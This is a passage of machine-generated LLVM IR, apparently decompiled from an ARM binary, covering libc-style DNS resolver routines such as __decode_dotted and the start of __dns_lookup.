  br label %dec_label_pc_10d44

dec_label_pc_10d24:                               ; preds = %.thread2
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_10d28 = inttoptr i32 %arg3 to i8*
  %v3_10d28 = call i32 @strcpy(i8* %v2_10d28, i32 %v2_10c08)
  br label %dec_label_pc_10d2c

dec_label_pc_10d2c:                               ; preds = %dec_label_pc_10b0c, %dec_label_pc_10d24
  %storemerge = phi i32 [ %v3_10b18, %dec_label_pc_10b0c ], [ %v3_10d28, %dec_label_pc_10d24 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10d44

dec_label_pc_10d34:                               ; preds = %dec_label_pc_10b00
  %v0_10d34 = call i32 @__GI___errno_location()
  store i32 %v0_10d34, i32* %r0.global-to-local, align 4
  %v2_10d3c = inttoptr i32 %v0_10d34 to i32*
  store i32 97, i32* %v2_10d3c, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10d44

dec_label_pc_10d44:                               ; preds = %bb57, %dec_label_pc_10d2c, %dec_label_pc_10d10, %dec_label_pc_10d34
  %v0_10d44 = phi i32 [ %v1_10c9c, %bb57 ], [ %storemerge, %dec_label_pc_10d2c ], [ %v0_10d44.pre, %dec_label_pc_10d10 ], [ 0, %dec_label_pc_10d34 ]
  store i32 %v0_10d44, i32* %r0.global-to-local, align 4
  store i32 %v6_10adc, i32* %r5.global-to-local, align 4
  ret i32 %v0_10d44

; uselistorder directives
  uselistorder i32 %v0_10d44, { 1, 0 }
  uselistorder i1 %v7_10c20, { 2, 0, 1 }
  uselistorder i32 %v0_10c20.pre, { 1, 0, 2 }
  uselistorder i32 %v1_10cd0, { 0, 2, 1 }
  uselistorder i32 %v0_10cbc, { 1, 0 }
  uselistorder i32 %v0_10ca4, { 1, 0 }
  uselistorder i32 %v5_10c50, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i1 %v9_10c28, { 1, 0, 2 }
  uselistorder i32 %v2_10c5069, { 0, 3, 2, 1 }
  uselistorder i32 %v0_10c4c71, { 5, 4, 2, 3, 0, 1 }
  uselistorder i1 %v7_10c2068, { 1, 0 }
  uselistorder i32 %v2_10c08, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_10c18, { 1, 0, 2 }
  uselistorder i1 %v7_10bf4, { 1, 0 }
  uselistorder i32 %v0_10bf4, { 1, 2, 0 }
  uselistorder i32 %v1_10c18.pre, { 2, 0, 1 }
  uselistorder i32 %v0_10bec.pre, { 0, 1, 3, 2 }
  uselistorder i1 %v7_10bdc, { 1, 0 }
  uselistorder i1 %v7_10bd4, { 1, 0 }
  uselistorder i32 %v1_10bc8, { 1, 0 }
  uselistorder i32 %v0_10bdc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10bf0, { 1, 2, 0, 3 }
  uselistorder i1 %v7_10b90, { 1, 0 }
  uselistorder i32 %v0_10bc8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_10bac, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_10bbc, { 3, 1, 0, 2 }
  uselistorder i32 %v1_10b4c, { 1, 0, 2 }
  uselistorder i32 %v2_10b34, { 1, 0 }
  uselistorder i32 %v0_10b4c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_10b50, { 0, 4, 3, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 5, 6, 8, 7, 13, 9, 10, 11, 12, 14, 15, 16, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 15, 16, 17, 18, 19, 23, 20, 21, 22 }
  uselistorder i8 58, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10d44, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10d2c, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10cd0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c20, { 1, 0 }
  uselistorder label %dec_label_pc_10bf4._crit_edge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10bf4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10bec, { 1, 0 }
  uselistorder label %dec_label_pc_10bc8, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10bc4, { 1, 0 }
  uselistorder label %dec_label_pc_10b7c, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_10d60 = load i32, i32* @r5, align 4
  %v0_10d64 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10d64, i32* %sl.global-to-local, align 4
  %v2_10d64 = icmp eq i32 %v0_10d64, 0
  br i1 %v2_10d64, label %.thread30, label %dec_label_pc_10d8c.preheader

.thread30:                                        ; preds = %entry
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_10e4c

dec_label_pc_10d8c.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10d8c4 = load i32, i32* @r1, align 4
  %v6_10d9014 = icmp slt i32 %v0_10d8c4, %arg2
  br i1 %v6_10d9014, label %dec_label_pc_10d94.preheader, label %dec_label_pc_10e4c

dec_label_pc_10d94.preheader:                     ; preds = %dec_label_pc_10d8c.preheader
  %v2_10d9451 = add i32 %v0_10d64, %v0_10d8c4
  %v3_10d9452 = inttoptr i32 %v2_10d9451 to i8*
  %v4_10d9453 = load i8, i8* %v3_10d9452, align 1
  %v6_10d9454 = zext i8 %v4_10d9453 to i32
  store i32 %v6_10d9454, i32* @r4, align 4
  %v2_10d9855 = icmp eq i8 %v4_10d9453, 0
  br i1 %v2_10d9855, label %bb49, label %dec_label_pc_10da0

dec_label_pc_10d88:                               ; preds = %bb48, %bb44
  %v1_10d8c = phi i32 [ %v1_10d8c.pre, %bb48 ], [ %v1_10db859, %bb44 ]
  %v0_10d8c = phi i32 [ %v0_10d8c.pre, %bb48 ], [ %v5_10dd0, %bb44 ]
  %v0_10d88 = phi i32 [ %v0_10d88.pre, %bb48 ], [ %v0_10dd460, %bb44 ]
  store i32 %v0_10d88, i32* %r0.global-to-local, align 4
  %v6_10d90 = icmp slt i32 %v0_10d8c, %v1_10d8c
  br i1 %v6_10d90, label %dec_label_pc_10d88.dec_label_pc_10d94_crit_edge, label %dec_label_pc_10e4c

dec_label_pc_10d88.dec_label_pc_10d94_crit_edge:  ; preds = %dec_label_pc_10d88
  %v0_10d94.pre = load i32, i32* %sl.global-to-local, align 4
  %v2_10d94 = add i32 %v0_10d94.pre, %v0_10d8c
  %v3_10d94 = inttoptr i32 %v2_10d94 to i8*
  %v4_10d94 = load i8, i8* %v3_10d94, align 1
  %v6_10d94 = zext i8 %v4_10d94 to i32
  store i32 %v6_10d94, i32* @r4, align 4
  %v2_10d98 = icmp eq i8 %v4_10d94, 0
  %v0_10e38 = load i32, i32* @ip, align 4
  %v2_10e38 = icmp eq i32 %v0_10e38, 0
  br i1 %v2_10d98, label %dec_label_pc_10e38, label %dec_label_pc_10da0

dec_label_pc_10da0:                               ; preds = %dec_label_pc_10d94.preheader, %dec_label_pc_10d88.dec_label_pc_10d94_crit_edge
  %v2_10e3866 = phi i1 [ %v2_10e38, %dec_label_pc_10d88.dec_label_pc_10d94_crit_edge ], [ false, %dec_label_pc_10d94.preheader ]
  %v0_10e3864 = phi i32 [ %v0_10e38, %dec_label_pc_10d88.dec_label_pc_10d94_crit_edge ], [ 1, %dec_label_pc_10d94.preheader ]
  %v6_10d9463 = phi i32 [ %v6_10d94, %dec_label_pc_10d88.dec_label_pc_10d94_crit_edge ], [ %v6_10d9454, %dec_label_pc_10d94.preheader ]
  %v0_10dc062 = phi i32 [ %v0_10d94.pre, %dec_label_pc_10d88.dec_label_pc_10d94_crit_edge ], [ %v0_10d64, %dec_label_pc_10d94.preheader ]
  %v0_10db061 = phi i32 [ %v0_10d8c, %dec_label_pc_10d88.dec_label_pc_10d94_crit_edge ], [ %v0_10d8c4, %dec_label_pc_10d94.preheader ]
  %v0_10dd460 = phi i32 [ %v0_10d88, %dec_label_pc_10d88.dec_label_pc_10d94_crit_edge ], [ 0, %dec_label_pc_10d94.preheader ]
  %v1_10db859 = phi i32 [ %v1_10d8c, %dec_label_pc_10d88.dec_label_pc_10d94_crit_edge ], [ %arg2, %dec_label_pc_10d94.preheader ]
  %v1_10da4 = and i32 %v6_10d9463, 192
  br i1 %v2_10e3866, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_10da0
  %v1_10da8 = load i32, i32* %r8.global-to-local, align 4
  %v2_10da8 = add i32 %v1_10da8, 1
  store i32 %v2_10da8, i32* %r8.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_10da0, %bb
  %v2_10dac = icmp eq i32 %v1_10da4, 192
  %v1_10db0 = add i32 %v0_10db061, 1
  store i32 %v1_10db0, i32* %r1.global-to-local, align 4
  br i1 %v2_10dac, label %dec_label_pc_10db8, label %dec_label_pc_10de0

dec_label_pc_10db8:                               ; preds = %bb42
  %v6_10dbc = icmp slt i32 %v1_10db0, %v1_10db859
  br i1 %v6_10dbc, label %dec_label_pc_10dc0, label %dec_label_pc_10e4c

dec_label_pc_10dc0:                               ; preds = %dec_label_pc_10db8
  %v2_10dc0 = add i32 %v1_10db0, %v0_10dc062
  %v3_10dc0 = inttoptr i32 %v2_10dc0 to i8*
  %v4_10dc0 = load i8, i8* %v3_10dc0, align 1
  %v6_10dc0 = zext i8 %v4_10dc0 to i32
  %v1_10dc8 = urem i32 %v6_10d9463, 64
  br i1 %v2_10e3866, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_10dc0
  %v1_10dcc = load i32, i32* %r8.global-to-local, align 4
  %v2_10dcc = add i32 %v1_10dcc, 1
  store i32 %v2_10dcc, i32* %r8.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_10dc0, %bb43
  %v4_10dd0 = mul nuw nsw i32 %v1_10dc8, 256
  %v5_10dd0 = or i32 %v6_10dc0, %v4_10dd0
  store i32 %v5_10dd0, i32* %r1.global-to-local, align 4
  store i32 %v0_10dd460, i32* %r7.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_10d88

dec_label_pc_10de0:                               ; preds = %bb42
  %v2_10de0 = add i32 %v6_10d9463, %v0_10dd460
  store i32 %v2_10de0, i32* %r6.global-to-local, align 4
  %v3_10de4 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_10de4, i32* @r3, align 4
  %v1_10de8 = add i32 %v2_10de0, 1
  store i32 %v1_10de8, i32* %r7.global-to-local, align 4
  %v3_10dec = icmp ult i32 %v1_10de8, %v3_10de4
  br i1 %v3_10dec, label %dec_label_pc_10df4, label %dec_label_pc_10e4c

dec_label_pc_10df4:                               ; preds = %dec_label_pc_10de0
  %v2_10df4 = add i32 %v6_10d9463, %v1_10db0
  store i32 %v2_10df4, i32* @r5, align 4
  %v3_10df8 = icmp ult i32 %v2_10df4, %v1_10db859
  br i1 %v3_10df8, label %dec_label_pc_10e00, label %dec_label_pc_10e4c

dec_label_pc_10e00:                               ; preds = %dec_label_pc_10df4
  %v2_10e00 = add i32 %v1_10db0, %v0_10dc062
  store i32 %v2_10e00, i32* @r1, align 4
  %v0_10e04 = load i32, i32* %sb.global-to-local, align 4
  %v2_10e04 = add i32 %v0_10e04, %v0_10dd460
  store i32 %v2_10e04, i32* @r0, align 4
  store i32 %v6_10d9463, i32* @r2, align 4
  %v0_10e10 = call i32 @memcpy()
  store i32 %v0_10e10, i32* %r0.global-to-local, align 4
  store i32 %v0_10e3864, i32* @ip, align 4
  %v0_10e18 = load i32, i32* %sl.global-to-local, align 4
  %v1_10e18 = load i32, i32* @r5, align 4
  %v2_10e18 = add i32 %v1_10e18, %v0_10e18
  %v3_10e18 = inttoptr i32 %v2_10e18 to i8*
  %v4_10e18 = load i8, i8* %v3_10e18, align 1
  br i1 %v2_10e3866, label %bb46, label %bb45

bb45:                                             ; preds = %dec_label_pc_10e00
  %v1_10e20 = load i32, i32* %r8.global-to-local, align 4
  %v2_10e20 = load i32, i32* @r4, align 4
  %v3_10e20 = add i32 %v2_10e20, %v1_10e20
  store i32 %v3_10e20, i32* %r8.global-to-local, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_10e00, %bb45
  %v2_10e24 = icmp eq i8 %v4_10e18, 0
  br i1 %v2_10e24, label %bb48, label %bb47

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_10e30.off0 = phi i8 [ 0, %bb46 ], [ 46, %bb47 ]
  store i32 %v1_10e18, i32* %r1.global-to-local, align 4
  %v2_10e30 = load i32, i32* %sb.global-to-local, align 4
  %v3_10e30 = load i32, i32* %r6.global-to-local, align 4
  %v4_10e30 = add i32 %v3_10e30, %v2_10e30
  %v5_10e30 = inttoptr i32 %v4_10e30 to i8*
  store i8 %v0_10e30.off0, i8* %v5_10e30, align 1
  %v0_10d88.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_10d8c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_10d8c.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_10d88

dec_label_pc_10e38:                               ; preds = %dec_label_pc_10d88.dec_label_pc_10d94_crit_edge
  %v0_10e40.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_10e38, label %dec_label_pc_10e4c, label %bb49

bb49:                                             ; preds = %dec_label_pc_10d94.preheader, %dec_label_pc_10e38
  %v0_10e40.pre69 = phi i32 [ %v0_10e40.pre.pre, %dec_label_pc_10e38 ], [ 0, %dec_label_pc_10d94.preheader ]
  %v2_10e3c = add i32 %v0_10e40.pre69, 1
  store i32 %v2_10e3c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10e4c

dec_label_pc_10e4c:                               ; preds = %dec_label_pc_10df4, %dec_label_pc_10de0, %dec_label_pc_10db8, %dec_label_pc_10d88, %dec_label_pc_10e38, %dec_label_pc_10d8c.preheader, %bb49, %.thread30
  %storemerge = phi i32 [ -1, %.thread30 ], [ %v2_10e3c, %bb49 ], [ -1, %dec_label_pc_10d8c.preheader ], [ %v0_10e40.pre.pre, %dec_label_pc_10e38 ], [ -1, %dec_label_pc_10de0 ], [ -1, %dec_label_pc_10df4 ], [ -1, %dec_label_pc_10d88 ], [ -1, %dec_label_pc_10db8 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_10d60, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_10e40.pre.pre, { 1, 0 }
  uselistorder i32 %v1_10e18, { 1, 0 }
  uselistorder i32 %v5_10dd0, { 1, 0 }
  uselistorder i32 %v1_10db0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_10dd460, { 3, 2, 0, 1 }
  uselistorder i32 %v6_10d9463, { 2, 4, 3, 0, 1 }
  uselistorder i1 %v2_10e3866, { 1, 2, 0 }
  uselistorder i32 %v0_10d64, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 3, 4, 1, 2 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_10e4c, { 6, 4, 0, 1, 2, 3, 5, 7 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_10da0, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp144 = call i32 @__decompiler_undefined_function_0()
  %tmp159 = call i32 @__decompiler_undefined_function_0()
  %tmp160 = call i32 @__decompiler_undefined_function_0()
  %tmp161 = call i32 @__decompiler_undefined_function_0()
  %tmp172 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-448 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-104 = alloca i16, align 2
  %stack_var_-76 = alloca i32, align 4
  %v3_10e58 = load i32, i32* @r4, align 4
  %v6_10e58 = load i32, i32* @r5, align 4
  %v9_10e58 = load i32, i32* @r6, align 4
  %v12_10e58 = load i32, i32* @r7, align 4
  %v15_10e58 = load i32, i32* @r8, align 4
  %v18_10e58 = load i32, i32* @sb, align 4
  %v21_10e58 = load i32, i32* @sl, align 4
  %v24_10e58 = load i32, i32* @fp, align 4
  %v27_10e58 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg4, i32* @fp, align 4
  %v0_10e6c = load i32, i32* %r1.global-to-local, align 4
  %v1_10e74 = call i32 @malloc(i32 512)
  store i32 %v1_10e74, i32* @sl, align 4
  %v0_10e7c = load i32, i32* @r4, align 4
  %v1_10e7c = inttoptr i32 %v0_10e7c to i8*
  %v3_10e80 = call i32 @strlen(i8* %v1_10e7c)
  store i32 894, i32* %r3.global-to-local, align 4
  %v3_10e8c = icmp ugt i32 %v3_10e80, 893
  store i1 %v3_10e8c, i1* %cpsr_c.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r8, align 4
  %tmp285 = icmp ugt i32 %v3_10e80, 894
  br i1 %tmp285, label %.thread132, label %dec_label_pc_10eac

.thread132:                                       ; preds = %entry
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_115bc

dec_label_pc_10eac:                               ; preds = %entry
  %v1_10eb0 = add i32 %v3_10e80, 130
  %v1_10eb4 = call i32 @malloc(i32 %v1_10eb0)
  store i32 %v1_10eb4, i32* @r0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10eb8 = icmp eq i32 %v1_10eb4, 0
  br i1 %v2_10eb8, label %.thread5, label %bb

bb:                                               ; preds = %dec_label_pc_10eac
  %v1_10ebc = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_10ebc = icmp eq i32 %v1_10ebc, 0
  br i1 %v3_10ebc, label %bb213, label %dec_label_pc_10ed0

.thread5:                                         ; preds = %dec_label_pc_10eac
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_115b4

bb213:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_115b4

dec_label_pc_10ed0:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v0_10ed0 = load i32, i32* @r4, align 4
  %v1_10ed0 = inttoptr i32 %v0_10ed0 to i8*
  %v2_10ed0 = load i8, i8* %v1_10ed0, align 1
  %v3_10ed0 = zext i8 %v2_10ed0 to i32
  store i32 %v3_10ed0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10ed4 = icmp eq i8 %v2_10ed0, 0
  br i1 %v2_10ed4, label %dec_label_pc_115b4, label %dec_label_pc_10edc

dec_label_pc_10edc:                               ; preds = %dec_label_pc_10ed0
  %v2_10ee0 = add i32 %v0_10ed0, %v3_10e80
  store i32 %v2_10ee0, i32* %r3.global-to-local, align 4
  %v1_10ee4 = add i32 %v2_10ee0, -1
  %v2_10ee4 = inttoptr i32 %v1_10ee4 to i8*
  %v3_10ee4 = load i8, i8* %v2_10ee4, align 1
  %v4_10ee4 = zext i8 %v3_10ee4 to i32
  store i32 %v4_10ee4, i32* @r3, align 4
  store i32 %v3_10e80, i32* @r2, align 4
  store i32 %v0_10ed0, i32* @r1, align 4
  %v0_10ef4 = call i32 @memcpy()
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 10472, i32* %ip.global-to-local, align 4
  store i32 9512, i32* %r1.global-to-local, align 4
  store i32 -1, i32* @sb, align 4
  %v2_10f70 = ptrtoint i32* %stack_var_-76 to i32
  %v2_11088 = ptrtoint i16* %stack_var_-104 to i32
  %v15_1108c = ptrtoint i32* %stack_var_-88 to i32
  %v2_110b0 = ptrtoint i32* %stack_var_-192 to i32
  %v2_110d0 = bitcast i32* %stack_var_-192 to i8*
  %v2_11184 = ptrtoint i32* %stack_var_-48 to i32
  %v2_11190 = ptrtoint i32* %stack_var_-56 to i32
  %v2_1121c = icmp eq i32 %tmp161, 0
  %v1_11228 = add i32 %tmp160, -2
  %v2_1122c = icmp ne i32 %v1_11228, 0
  %tmp214 = icmp slt i32 %tmp159, 1
  %v2_11318 = ptrtoint i32* %stack_var_-448 to i32
  %v2_1131c = ptrtoint i32* %stack_var_-144 to i32
  %v5_1156056 = icmp sgt i32 %tmp159, 0
  %v2_11488 = icmp ne i32 %v0_10e6c, 0
  %v7_11488 = icmp eq i32 %v0_10e6c, 1
  %v1_1137c = bitcast i32* %stack_var_-448 to i8*
  %v2_11430 = icmp eq i32 %tmp144, 0
  %v2_11238 = icmp ugt i8 %v3_10ee4, 45
  %v7_11238 = icmp eq i8 %v3_10ee4, 46
  %v1_10fe4 = add i32 %v1_10eb4, 1
  %stack_var_-476.0.pre = load i32, i32* @r5, align 4
  %v4_10fc4 = add i32 %v1_10eb4, %v3_10e80
  %v5_10fc4 = inttoptr i32 %v4_10fc4 to i8*
  %v1_11228.cmp = icmp ugt i32 %v1_11228, 1
  %v2_11260 = icmp eq i32 %tmp160, 0
  %v3_1148c = icmp ugt i32 %v0_10e6c, 27
  %v8_1148c = icmp eq i32 %v0_10e6c, 28
  br label %dec_label_pc_10f54

dec_label_pc_10f54:                               ; preds = %dec_label_pc_1159c, %dec_label_pc_10edc
  %stack_var_-476.0 = phi i32 [ %stack_var_-476.0.pre, %dec_label_pc_10edc ], [ %v1_115a0, %dec_label_pc_1159c ]
  %stack_var_-464.0 = phi i32 [ %tmp172, %dec_label_pc_10edc ], [ %v3_11068, %dec_label_pc_1159c ]
  %stack_var_-468.0 = phi i32 [ -1, %dec_label_pc_10edc ], [ %stack_var_-468.2, %dec_label_pc_1159c ]
  %v1_10f5c = phi i32 [ -1, %dec_label_pc_10edc ], [ %v3_1113c, %dec_label_pc_1159c ]
  store i32 %v1_10f5c, i32* %r3.global-to-local, align 4
  %v2_10f58 = icmp eq i32 %v1_10f5c, -1
  store i1 %v2_10f58, i1* %cpsr_c.global-to-local, align 1
  %v7_10f58 = icmp eq i32 %v1_10f5c, -1
  br i1 %v7_10f58, label %bb216, label %bb215

bb215:                                            ; preds = %dec_label_pc_10f54
  br label %bb216

bb216:                                            ; preds = %dec_label_pc_10f54, %bb215
  %v1_10f60 = xor i1 %v7_10f58, true
  call void @__pseudo_cond_branch(i1 %v1_10f60, i32 ptrtoint (i32* @global_var_aab0.352 to i32))
  store i32 36, i32* @r7, align 4
  %v0_10f6c = load i32, i32* @r8, align 4
  %v2_10f6c = add i32 %v0_10f6c, 40
  %v3_10f6c = inttoptr i32 %v2_10f6c to i32*
  %v4_10f6c = load i32, i32* %v3_10f6c, align 4
  store i32 %v4_10f6c, i32* @r4, align 4
  store i32 %v2_10f70, i32* @r5, align 4
  store i32 76, i32* %ip.global-to-local, align 4
  %v2_10f7c = add i32 %v0_10f6c, 36
  %v3_10f7c = inttoptr i32 %v2_10f7c to i32*
  %v4_10f7c = load i32, i32* %v3_10f7c, align 4
  store i32 %v4_10f7c, i32* %r1.global-to-local, align 4
  %v2_10f84 = add i32 %v0_10f6c, 76
  %v3_10f84 = inttoptr i32 %v2_10f84 to i32*
  %v4_10f84 = load i32, i32* %v3_10f84, align 4
  store i32 %v4_10f84, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_10f84)
  store i32 16, i32* %r1.global-to-local, align 4
  %v0_10f98 = load i32, i32* @r8, align 4
  %v2_10f98 = add i32 %v0_10f98, 16
  %v3_10f98 = inttoptr i32 %v2_10f98 to i32*
  %v4_10f98 = load i32, i32* %v3_10f98, align 4
  store i32 %v4_10f98, i32* %ip.global-to-local, align 4
  store i32 69540, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10f98)
  %v0_10fa4 = call i32 @__open_nameservers()
  %v0_10fac = load i32, i32* @r8, align 4
  %v2_10fac = add i32 %v0_10fac, 10484
  %v3_10fac = inttoptr i32 %v2_10fac to i32*
  %v4_10fac = load i32, i32* %v3_10fac, align 4
  store i32 %v1_10eb4, i32* %r3.global-to-local, align 4
  store i32 %v3_10e80, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_10fbc = load i32, i32* @sb, align 4
  %v3_10fbc = icmp uge i32 %v0_10fbc, %v4_10fac
  store i1 %v3_10fbc, i1* %cpsr_c.global-to-local, align 1
  store i8 0, i8* %v5_10fc4, align 1
  %v0_10fc8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_10fc8, label %dec_label_pc_10ff4, label %dec_label_pc_10fcc

dec_label_pc_10fcc:                               ; preds = %bb216
  store i32 46, i32* %r3.global-to-local, align 4
  %v3_10fd4 = load i32, i32* %ip.global-to-local, align 4
  %v4_10fd4 = add i32 %v3_10fd4, %v1_10eb4
  %v5_10fd4 = inttoptr i32 %v4_10fd4 to i8*
  store i8 46, i8* %v5_10fd4, align 1
  store i32 10472, i32* %r1.global-to-local, align 4
  %v0_10fe0 = load i32, i32* @r8, align 4
  %v2_10fe0 = add i32 %v0_10fe0, 10472
  %v3_10fe0 = inttoptr i32 %v2_10fe0 to i32*
  %v4_10fe0 = load i32, i32* %v3_10fe0, align 4
  store i32 %v4_10fe0, i32* %r3.global-to-local, align 4
  %v1_10fe8 = load i32, i32* %ip.global-to-local, align 4
  %v2_10fe8 = add i32 %v1_10fe4, %v1_10fe8
  %v1_10fec = load i32, i32* @sb, align 4
  %v2_10fec = and i32 %v1_10fec, 1073741824
  %v3_10fec = icmp ne i32 %v2_10fec, 0
  store i1 %v3_10fec, i1* %cpsr_c.global-to-local, align 1
  %v4_10fec = mul i32 %v1_10fec, 4
  %v5_10fec = add i32 %v4_10fec, %v4_10fe0
  %v6_10fec = inttoptr i32 %v5_10fec to i32*
  %v7_10fec = load i32, i32* %v6_10fec, align 4
  store i32 %v7_10fec, i32* @r1, align 4
  %v2_10ff0 = inttoptr i32 %v2_10fe8 to i8*
  %v3_10ff0 = call i32 @strcpy(i8* %v2_10ff0, i32 %v7_10fec)
  br label %dec_label_pc_10ff4

dec_label_pc_10ff4:                               ; preds = %bb216, %dec_label_pc_10fcc
  store i32 %stack_var_-468.0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_10ff8 = icmp slt i32 %stack_var_-468.0, 0
  br i1 %v1_10ff8, label %dec_label_pc_11000, label %dec_label_pc_10ff4.dec_label_pc_11030_crit_edge

dec_label_pc_10ff4.dec_label_pc_11030_crit_edge:  ; preds = %dec_label_pc_10ff4
  %v0_11038.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_11030

dec_label_pc_11000:                               ; preds = %dec_label_pc_10ff4
  store i32 10480, i32* %r3.global-to-local, align 4
  store i32 727, i32* %ip.global-to-local, align 4
  %v0_11008 = load i32, i32* @r8, align 4
  %v2_11008 = add i32 %v0_11008, 10480
  %v3_11008 = inttoptr i32 %v2_11008 to i32*
  %v4_11008 = load i32, i32* %v3_11008, align 4
  %v2_1100c = add i32 %v0_11008, 727
  %v3_1100c = inttoptr i32 %v2_1100c to i8*
  %v4_1100c = load i8, i8* %v3_1100c, align 1
  %v6_1100c = zext i8 %v4_1100c to i32
  %v2_11010 = mul i32 %v6_1100c, %v4_11008
  store i32 %v2_11010, i32* %r3.global-to-local, align 4
  store i32 9512, i32* %r1.global-to-local, align 4
  %v2_1101c = add i32 %v0_11008, 724
